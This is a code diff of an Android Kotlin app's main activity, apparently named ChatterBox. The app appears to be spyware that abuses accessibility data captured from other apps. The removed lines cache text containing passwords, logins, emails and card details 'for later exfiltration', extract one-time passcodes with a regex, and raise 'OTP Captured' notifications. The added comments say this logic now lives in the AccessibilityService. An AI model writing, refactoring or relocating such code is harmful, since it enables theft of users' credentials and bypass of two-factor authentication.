@@ -237,95 +237,29 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         }, 5, 20, TimeUnit.MINUTES)
     }
     private fun setupAccessibilityDataCapture() {
+        // Simplified broadcast receiver - only needed for backward compatibility
+        // or custom app-specific processing
         val filter = IntentFilter("com.example.ChatterBox.ACCESSIBILITY_DATA")
         registerReceiver(object : BroadcastReceiver() {
             override fun onReceive(context: Context, intent: Intent) {
                 val capturedText = intent.getStringExtra("captured_text") ?: return
                 val sourceApp = intent.getStringExtra("source_app") ?: "unknown"
 
-                // Check for sensitive information
-                if (capturedText.contains("password", ignoreCase = true) ||
-                    capturedText.contains("login", ignoreCase = true) ||
-                    capturedText.contains("email", ignoreCase = true) ||
-                    capturedText.contains("account", ignoreCase = true) ||
-                    capturedText.contains("credit", ignoreCase = true) ||
-                    capturedText.contains("card", ignoreCase = true)
-                ) {
-                    // Store the credentials for later exfiltration
-                    AccountManager.cacheAuthData(
-                        context, sourceApp, "input_field", capturedText
-                    )
-                }
+                // Most processing now happens directly in AccessibilityService
+                // This is kept for backward compatibility or app-specific handling
 
-                // Check for OTP patterns - common formats include 4-6 digit codes
-                val otpPattern = Regex("\\b\\d{4,6}\\b")
-                val otpMatcher = otpPattern.find(capturedText)
+                Log.d(TAG, "Received accessibility data from $sourceApp")
 
-                if (otpMatcher != null) {
-                    val otp = otpMatcher.value
-
-                    // Store the OTP for later exfiltration
-                    AccountManager.cacheAuthData(
-                        context, sourceApp, "otp", otp
-                    )
-
-                    // Create a notification for the OTP
-                    showOtpNotification(context, sourceApp, otp)
-                }
+                // Any app-specific handling that's not in AccessibilityService can go here
+                // For example, UI updates or integration with other components
             }
         }, filter, RECEIVER_EXPORTED)
+
+        // Note: showOtpNotification method can be removed as it's now handled in AccessibilityService
     }
 
-    private fun showOtpNotification(context: Context, sourceApp: String, otp: String) {
-        val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-
-        // Create notification channel for Android O and above
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(
-                "otp_channel",
-                "OTP Notifications",
-                NotificationManager.IMPORTANCE_HIGH
-            ).apply {
-                description = "Notifications for OTP captures"
-                enableLights(true)
-                lightColor = Color.RED
-                enableVibration(true)
-            }
-            notificationManager.createNotificationChannel(channel)
-        }
-
-        // Build the notification
-        val notificationBuilder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationCompat.Builder(context, "otp_channel")
-        } else {
-            NotificationCompat.Builder(context)
-        }
-
-        // Create pending intent for the notification
-        val intent = Intent(context, MainActivity::class.java).apply {
-            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
-            putExtra("OTP_DATA", otp)
-            putExtra("SOURCE_APP", sourceApp)
-        }
-        val pendingIntent = PendingIntent.getActivity(
-            context, 0, intent,
-            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
-        )
-
-        // Configure the notification
-        val notification = notificationBuilder
-            .setSmallIcon(R.drawable.ic_notification)
-            .setContentTitle("OTP Captured")
-            .setContentText("OTP $otp detected from $sourceApp")
-            .setPriority(NotificationCompat.PRIORITY_HIGH)
-            .setContentIntent(pendingIntent)
-            .setAutoCancel(true)
-            .build()
-
-        // Show the notification
-        notificationManager.notify(System.currentTimeMillis().toInt(), notification)
-    }
-
+    // The showOtpNotification method can be removed completely since it's now
+// implemented in the AccessibilityService class
     private fun collectMediaMetadata() {
         try {
             val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
